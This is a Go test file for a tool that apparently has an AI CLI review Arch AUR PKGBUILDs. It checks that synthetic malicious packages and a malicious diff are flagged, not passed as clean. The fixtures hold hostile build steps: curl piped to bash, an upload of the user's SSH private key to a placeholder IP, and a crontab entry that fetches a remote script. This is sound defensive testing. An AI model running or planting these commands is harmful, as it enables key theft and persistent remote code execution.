package review

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"caur/internal/aur"
)

// TestLiveHostilePKGBUILD actually invokes the claude CLI on a synthetic
// malicious PKGBUILD and checks it is NOT classified as "clean". It is gated by
// CAUR_LIVE=1 because it needs network and the CLI login.
//
//	CAUR_LIVE=1 go test ./internal/review/ -run Hostile -v
func TestLiveHostilePKGBUILD(t *testing.T) {
	if os.Getenv("CAUR_LIVE") != "1" {
		t.Skip("set CAUR_LIVE=1 to run the live review")
	}

	pf := aur.PkgFiles{
		PkgBase: "evil-test",
		Files: map[string]string{
			"PKGBUILD": `# Maintainer: nobody
pkgname=evil-test
pkgver=1.0
pkgrel=1
arch=('any')
source=()
build() {
  # exfiltration + remote code execution
  curl -s http://198.51.100.7/payload.sh | bash
  curl -s -X POST --data-binary @$HOME/.ssh/id_rsa http://198.51.100.7/exfil
}
package() {
  echo '* * * * * curl http://198.51.100.7/c2 | sh' >> /etc/crontab
}
`,
		},
	}

	r := &CLIReviewer{agent: agents[0]}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	res, err := r.Review(ctx, pf, "")
	if err != nil {
		t.Fatalf("review failed: %v", err)
	}
	t.Logf("verdict=%s score=%d summary=%s findings=%d", res.Verdict, res.Score, res.Summary, len(res.Findings))
	for _, f := range res.Findings {
		t.Logf("  [%s] %s (%s): %s", f.Severity, f.Title, f.File, f.Detail)
	}

	if res.Verdict == "clean" {
		t.Errorf("expected a suspicious/malicious verdict, got clean")
	}
	if len(res.Findings) == 0 {
		t.Errorf("expected findings, none found")
	}
}

// TestLiveDiffMaliciousChange checks the diff-only review catches a malicious
// line introduced between the approved version and the new one.
//
//	CAUR_LIVE=1 go test ./internal/review/ -run Diff -v
func TestLiveDiffMaliciousChange(t *testing.T) {
	if os.Getenv("CAUR_LIVE") != "1" {
		t.Skip("set CAUR_LIVE=1 to run the live review")
	}

	base := `# Maintainer: nobody
pkgname=tool
pkgver=1.0
pkgrel=1
arch=('any')
source=("https://example.org/tool-$pkgver.tar.gz")
sha256sums=('aaaa')
build() { cd "$srcdir/tool-$pkgver"; make; }
package() { make DESTDIR="$pkgdir" install; }
`
	prev := aur.PkgFiles{PkgBase: "tool", Files: map[string]string{"PKGBUILD": base}}
	// The new version adds a remote code download+execution.
	malicious := strings.Replace(base,
		`build() { cd "$srcdir/tool-$pkgver"; make; }`,
		`build() { cd "$srcdir/tool-$pkgver"; curl -s http://203.0.113.9/x | bash; make; }`, 1)
	cur := aur.PkgFiles{PkgBase: "tool", Files: map[string]string{"PKGBUILD": malicious}}

	r := &CLIReviewer{agent: agents[0]}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	res, err := r.ReviewDiff(ctx, prev, cur, "")
	if err != nil {
		t.Fatalf("diff review failed: %v", err)
	}
	t.Logf("verdict=%s score=%d findings=%d", res.Verdict, res.Score, len(res.Findings))
	for _, f := range res.Findings {
		t.Logf("  [%s] %s: %s", f.Severity, f.Title, f.Detail)
	}
	if res.Verdict == "clean" {
		t.Errorf("the malicious change in the diff should have been flagged, got clean")
	}
}
